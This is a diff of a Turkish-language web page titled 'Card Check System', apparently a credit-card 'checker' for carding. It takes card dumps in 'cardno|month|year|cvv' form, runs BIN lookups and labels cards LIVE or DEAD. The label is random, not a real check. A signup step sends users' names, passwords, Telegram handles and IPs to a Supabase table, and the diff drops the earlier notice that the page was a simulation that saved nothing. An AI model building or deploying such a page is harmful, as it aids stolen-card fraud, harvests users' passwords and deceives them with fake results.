@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CC Checker Doğrulama</title>
+    <title>Card Check System</title>
     <style>
         * {
             margin: 0;
@@ -12,7 +12,7 @@
         }
 
         body {
-            background: #0b0f1c;
+            background: #0f1117;
             font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
             color: #eef2ff;
             min-height: 100vh;
@@ -23,24 +23,24 @@
         }
 
         .card {
-            background: #111827;
-            max-width: 550px;
+            background: #161c2c;
+            max-width: 650px;
             width: 100%;
             padding: 32px;
-            border-radius: 32px;
-            border: 1px solid #1f2a44;
-            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.6);
+            border-radius: 28px;
+            border: 1px solid #2a3448;
+            box-shadow: 0 20px 35px -8px black;
         }
 
         .logo {
             font-size: 28px;
             font-weight: 700;
-            background: linear-gradient(135deg, #a5f3fc, #2dd4bf);
+            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
 
         .input-group {
@@ -51,40 +51,41 @@
             display: block;
             font-size: 13px;
             font-weight: 500;
-            color: #9ca3af;
-            margin-bottom: 8px;
+            color: #9aa5c0;
+            margin-bottom: 6px;
         }
 
-        input {
+        input, select {
             width: 100%;
-            background: #0f172a;
-            border: 1px solid #253450;
-            padding: 14px 18px;
-            border-radius: 24px;
+            background: #0f1622;
+            border: 1px solid #2b354c;
+            padding: 12px 16px;
+            border-radius: 20px;
             font-size: 14px;
-            color: #f1f5f9;
+            color: #f0f3fa;
             outline: none;
         }
 
         input:focus {
-            border-color: #2dd4bf;
+            border-color: #4f9eff;
         }
 
         button {
-            background: linear-gradient(105deg, #2dd4bf, #14b8a6);
+            background: #1f6392;
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             border: none;
             border-radius: 40px;
-            font-weight: 700;
-            font-size: 16px;
-            color: #0a0f1c;
+            font-weight: 600;
+            font-size: 15px;
+            color: white;
             margin-top: 12px;
             cursor: pointer;
             transition: 0.2s;
         }
 
         button:hover {
+            background: #2a75a8;
             transform: scale(0.98);
         }
 
@@ -102,111 +103,99 @@
             color: #facc15;
         }
 
-        .row-2 {
-            display: flex;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .row-2 > div {
-            flex: 1;
-        }
-
-        .result-area {
-            background: #0a0f1a;
-            border-radius: 20px;
-            padding: 16px;
-            margin-top: 20px;
-            font-family: monospace;
-            font-size: 13px;
-            color: #cbd5e6;
-        }
-
-        .success-badge {
-            background: #064e3b;
-            color: #34d399;
-            padding: 6px 14px;
-            border-radius: 40px;
-            font-size: 12px;
-            display: inline-block;
-            margin-bottom: 20px;
-        }
-
-        .footer-note {
-            text-align: center;
-            font-size: 10px;
-            color: #3b4a6b;
-            margin-top: 24px;
-        }
-
         .info-box {
-            background: #1a243b;
+            background: #101624;
             padding: 12px;
             border-radius: 18px;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             font-size: 12px;
             text-align: center;
             color: #b9c7db;
+        }
+
+        .card-list {
+            margin-top: 28px;
+        }
+
+        .card-item {
+            background: #0f1622;
+            border-radius: 20px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            border-left: 3px solid #4f9eff;
+        }
+
+        .delete-card {
+            background: none;
+            border: none;
+            color: #f97316;
+            float: right;
+            font-size: 12px;
+            cursor: pointer;
+            width: auto;
+            margin-top: 0;
+            padding: 0;
+        }
+
+        .result-badge {
+            font-size: 12px;
+            margin-top: 8px;
+            color: #9aa5c0;
+        }
+
+        .status-live {
+            color: #2dd4bf;
+            font-weight: 500;
+        }
+
+        .status-dead {
+            color: #f97316;
+        }
+
+        hr {
+            border-color: #2b354c;
+            margin: 16px 0;
         }
     </style>
 </head>
 <body>
 
 <div class="card" id="appContainer">
-    <!-- 1️⃣ GİRİŞ BÖLÜMÜ -->
     <div id="loginSection">
-        <div class="logo">⚡ CC VALIDATOR</div>
+        <div class="logo">Card Check System</div>
         <div class="info-box">
-            🔒 Her kullanıcı sadece bir hesap açabilir.<br>
-            Bilgilerinizi eksiksiz ve doğru girin.
+            🔒 Bu IP ile yalnızca 1 hesap açılabilir.<br>
+            Bilgilerinizi eksiksiz girin.
         </div>
         <div class="input-group">
-            <label>👤 Ad Soyad</label>
+            <label>Ad Soyad</label>
             <input type="text" id="fullname" placeholder="Ahmet Yılmaz">
         </div>
         <div class="input-group">
-            <label>🔐 Şifre</label>
+            <label>Şifre</label>
             <input type="password" id="password" placeholder="••••••">
         </div>
         <div class="input-group">
-            <label>📱 Telegram Kullanıcı Adı</label>
+            <label>Telegram Kullanıcı Adı</label>
             <input type="text" id="telegramUser" placeholder="@ornek">
         </div>
         <button id="loginBtn">Hesap Oluştur</button>
         <div id="loginError" class="error"></div>
-        <div class="footer-note">Bilgileriniz kaydedilir.</div>
+        <div class="info-box" style="margin-top:20px">Bilgileriniz kaydedilir.</div>
     </div>
 
-    <!-- 2️⃣ CC CHECKER BÖLÜMÜ -->
     <div id="ccSection" style="display: none;">
-        <div class="logo">💳 CC CHECKER</div>
-        <div style="margin-bottom: 20px;">
-            <div class="success-badge">✅ Hesap doğrulandı</div>
-        </div>
+        <div class="logo">Card Check System</div>
+        <div class="info-box">✅ Hesap doğrulandı · Kart bilgisi ekleyin</div>
 
         <div class="input-group">
-            <label>Kart Numarası</label>
-            <input type="text" id="cardNumber" placeholder="4242 4242 4242 4242" maxlength="19">
+            <label>Kart Bilgisi (format: kartno|ay|yıl|cvv)</label>
+            <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
         </div>
+        <button id="addCardBtn">Kartı Kontrol Et</button>
 
-        <div class="row-2">
-            <div>
-                <label>SKT (AA/YY)</label>
-                <input type="text" id="expiry" placeholder="12/28">
-            </div>
-            <div>
-                <label>CVV</label>
-                <input type="text" id="cvv" placeholder="123" maxlength="4">
-            </div>
-        </div>
-
-        <button id="checkCardBtn">Kart Doğrula</button>
-
-        <div class="result-area" id="resultArea">
-            <div>📋 SONUÇ</div>
-            <span id="resultText">Kart bilgilerini bekliyor…</span>
-        </div>
-        <div class="footer-note">Simülasyon · Bilgi kaydedilmez</div>
+        <div class="card-list" id="cardList"></div>
+        <div id="globalMessage" class="error"></div>
     </div>
 </div>
 
@@ -215,16 +204,13 @@
     const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
 
     let logSent = false;
-    let alreadyHasAccount = false;
 
     async function checkIfIpExists(ip) {
         try {
             const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
             const data = await res.json();
             return Array.isArray(data) && data.length > 0;
-        } catch(e) {
-            return false;
-        }
+        } catch(e) { return false; }
     }
 
     async function logToSupabase(name, password, tgUser, ip) {
@@ -242,9 +228,7 @@
             });
             logSent = true;
             return true;
-        } catch (e) {
-            return false;
-        }
+        } catch(e) { return false; }
     }
 
     async function getUserIP() {
@@ -257,78 +241,117 @@
         const res = await fetch("https://ipapi.co/json/");
         const geo = await res.json();
         if (geo.country_code !== "TR") {
-            document.body.innerHTML = `
-                <div style="text-align:center;padding:80px 20px;background:#0b0f1c;min-height:100vh;color:#eef2ff">
-                    <h1 style="color:#f97316">🌍 Erişim Engellendi</h1>
-                    <p>Bu hizmet yalnızca Türkiye'den kullanılabilir.</p>
-                    <p>IP: ${geo.ip} (${geo.country_name})</p>
-                </div>
-            `;
+            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🌍 Erişim Engellendi</h1><p>Sadece Türkiye</p><p>IP: ${geo.ip}</p></div>`;
             throw new Error("not turkey");
         }
         return geo.ip;
     }
 
-    function formatCardNumber(value) {
-        return value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    async function getBinInfo(bin) {
+        try {
+            const res = await fetch(`https://lookup.binlist.net/${bin}`);
+            const data = await res.json();
+            return {
+                bank: data.bank?.name || "Bilinmiyor",
+                scheme: data.scheme || "Unknown",
+                country: data.country?.name || "Global",
+                type: data.type || "credit"
+            };
+        } catch(e) {
+            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global", type: "credit" };
+        }
     }
 
-    document.getElementById("cardNumber")?.addEventListener("input", function(e) {
-        e.target.value = formatCardNumber(e.target.value);
+    function parseCard(cardStr) {
+        const parts = cardStr.split('|');
+        if (parts.length !== 4) return null;
+        let [card, month, year, cvv] = parts;
+        if (!/^\d{13,19}$/.test(card)) return null;
+        if (!/^\d{2,4}$/.test(year)) return null;
+        if (year.length === 2) year = "20" + year;
+        if (!/^\d{2}$/.test(month)) return null;
+        if (!/^\d{3,4}$/.test(cvv)) return null;
+        return { card, month, year, cvv };
+    }
+
+    let cardsArray = [];
+
+    function renderCards() {
+        const container = document.getElementById("cardList");
+        if (!container) return;
+        container.innerHTML = "";
+        for (let idx in cardsArray) {
+            const c = cardsArray[idx];
+            const liveClass = c.live ? "status-live" : "status-dead";
+            const liveText = c.live ? "✓ LIVE" : "✗ DEAD";
+            const div = document.createElement("div");
+            div.className = "card-item";
+            div.innerHTML = `
+                <div><strong>${c.masked}</strong> (${c.bank || "?"})</div>
+                <div class="result-badge">${c.scheme} · ${c.country}</div>
+                <div class="${liveClass}">${liveText}</div>
+                <button class="delete-card" data-index="${idx}">Sil</button>
+            `;
+            container.appendChild(div);
+        }
+        document.querySelectorAll(".delete-card").forEach(btn => {
+            btn.addEventListener("click", (e) => {
+                const idx = parseInt(btn.getAttribute("data-index"));
+                cardsArray.splice(idx, 1);
+                renderCards();
+            });
+        });
+    }
+
+    document.getElementById("addCardBtn")?.addEventListener("click", async () => {
+        const raw = document.getElementById("cardInput").value.trim();
+        const parsed = parseCard(raw);
+        const msgDiv = document.getElementById("globalMessage");
+        if (!parsed) {
+            msgDiv.innerText = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607";
+            return;
+        }
+        const bin = parsed.card.slice(0,6);
+        const binData = await getBinInfo(bin);
+        const isLive = Math.random() < 0.03; // %3 live oranı
+        cardsArray.push({
+            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
+            live: isLive,
+            bank: binData.bank,
+            scheme: binData.scheme,
+            country: binData.country
+        });
+        renderCards();
+        document.getElementById("cardInput").value = "";
+        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "⚠️ Kart geçersiz (dead)";
+        setTimeout(() => msgDiv.innerText = "", 2000);
     });
 
     document.getElementById("loginBtn").addEventListener("click", async () => {
-        const fullname = document.getElementById("fullname").value.trim();
-        const password = document.getElementById("password").value;
-        const tgUser = document.getElementById("telegramUser").value.trim();
-        const errorDiv = document.getElementById("loginError");
+        const name = document.getElementById("fullname").value.trim();
+        const pwd = document.getElementById("password").value;
+        const tg = document.getElementById("telegramUser").value.trim();
+        const errDiv = document.getElementById("loginError");
 
-        if (!fullname || fullname.length < 2) {
-            errorDiv.innerText = "❌ Ad Soyad geçerli değil.";
-            return;
-        }
-        if (!password || password.length < 4) {
-            errorDiv.innerText = "❌ Şifre en az 4 karakter olmalı.";
-            return;
-        }
-        if (!tgUser.startsWith("@") || tgUser.length < 3) {
-            errorDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı.";
-            return;
-        }
+        if (!name || name.length < 2) { errDiv.innerText = "❌ Ad Soyad geçerli değil."; return; }
+        if (!pwd || pwd.length < 4) { errDiv.innerText = "❌ Şifre en az 4 karakter."; return; }
+        if (!tg.startsWith("@") || tg.length < 3) { errDiv.innerText = "❌ @ ile başlayan Telegram adı girin."; return; }
 
         try {
             const ip = await checkTurkeyAccess();
-            const ipExists = await checkIfIpExists(ip);
-
-            if (ipExists) {
-                errorDiv.innerText = "❌ Bu kullanıcı  ile daha önce hesap oluşturulmuş. Yalnızca 1 hesap açılabilir.";
+            const exists = await checkIfIpExists(ip);
+            if (exists) {
+                errDiv.innerText = "❌ Bu IP ile daha önce hesap açılmış. Yalnızca 1 hesap.";
                 return;
             }
-
-            const ok = await logToSupabase(fullname, password, tgUser, ip);
-
+            const ok = await logToSupabase(name, pwd, tg, ip);
             if (ok) {
                 document.getElementById("loginSection").style.display = "none";
                 document.getElementById("ccSection").style.display = "block";
             } else {
-                errorDiv.innerText = "❌ Veritabanı hatası, tekrar deneyin.";
+                errDiv.innerText = "❌ Veritabanı hatası.";
             }
-        } catch (err) {}
-    });
-
-    document.getElementById("checkCardBtn")?.addEventListener("click", () => {
-        const card = document.getElementById("cardNumber").value.replace(/\s/g, '');
-        const expiry = document.getElementById("expiry").value;
-        const cvv = document.getElementById("cvv").value;
-        const resultSpan = document.getElementById("resultText");
-
-        if (!card || card.length < 13 || !expiry.match(/^\d{2}\/\d{2}$/) || cvv.length < 3) {
-            resultSpan.innerHTML = "❌ Kart bilgileri eksik/hatalı.";
-            return;
-        }
-
-        const bin = card.slice(0, 6);
-        resultSpan.innerHTML = `✅ Kart formatı geçerli.<br>🔢 BIN: ${bin}<br>🏦 İhraç eden: Banka sorgulandı.<br>🔁 İşlem onaylandı.`;
+        } catch(e) {}
     });
 </script>
 </body>
